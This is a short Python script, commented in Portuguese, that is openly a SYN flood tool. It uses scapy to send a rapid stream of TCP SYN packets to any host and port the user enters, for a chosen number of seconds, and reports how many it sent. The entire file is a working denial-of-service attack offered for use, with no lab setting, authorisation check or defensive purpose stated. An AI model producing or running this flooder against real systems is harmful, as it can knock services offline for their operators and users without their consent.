#!/usr/bin/env python3
"""SYN flood bem básico."""

import random
import sys
import time

try:
	from scapy.all import IP, TCP, send
except ImportError as exc:
	raise SystemExit("Instale a biblioteca scapy com: pip install scapy") from exc

DEFAULT_PORT = 80
DEFAULT_DURATION = 10


def syn_flood(target: str, port: int, duration: float, report_every: int = 50) -> int:
	"""Envia SYNs forjados para o alvo durante o período indicado."""
	inicio = time.time()
	enviados = 0
	try:
		while time.time() - inicio < duration:
			porta_origem = random.randint(1024, 65535)
			seq = random.randint(0, 4294967295)
			pacote = IP(dst=target) / TCP(sport=porta_origem, dport=port, flags="S", seq=seq)
			send(pacote, verbose=False)
			enviados += 1
			if report_every and enviados % report_every == 0:
				print(f"Enviados: {enviados}")
	except KeyboardInterrupt:
		print("Interrompido pelo usuário.")
	return enviados


def parse_args(argv):
	alvo = argv[0] if argv else None
	porta = None
	tempo = None
	if len(argv) > 1:
		try:
			porta = int(argv[1])
		except ValueError:
			print("Porta inválida via argumento. Usando padrão 80.")
	if len(argv) > 2:
		try:
			tempo = float(argv[2])
		except ValueError:
			print("Tempo inválido via argumento. Usando padrão 10s.")
	return alvo, porta, tempo


def main(argv=None):
	argv = [] if argv is None else list(argv)
	arg_target, arg_port, arg_time = parse_args(argv)
	print("Mini ferramenta de SYN flood")
	alvo = arg_target or input("IP/host alvo: ").strip()
	if not alvo:
		print("Nada informado. Saindo.")
		return

	if arg_port is not None:
		porta_destino = arg_port
	else:
		porta_texto = input("Porta do serviço (Enter usa 80): ").strip()
		if not porta_texto:
			porta_destino = DEFAULT_PORT
		else:
			try:
				porta_destino = int(porta_texto)
			except ValueError:
				print("Porta inválida. Usando 80.")
				porta_destino = DEFAULT_PORT

	if arg_time is not None:
		tempo_total = arg_time
	else:
		tempo_texto = input("Tempo em segundos (Enter usa 10): ").strip()
		if not tempo_texto:
			tempo_total = DEFAULT_DURATION
		else:
			try:
				tempo_total = float(tempo_texto)
			except ValueError:
				print("Tempo inválido. Usando 10 segundos.")
				tempo_total = DEFAULT_DURATION

	enviados = syn_flood(alvo, porta_destino, tempo_total)
	print(f"Total de SYN enviados: {enviados}")


if __name__ == "__main__":
	main(sys.argv[1:])
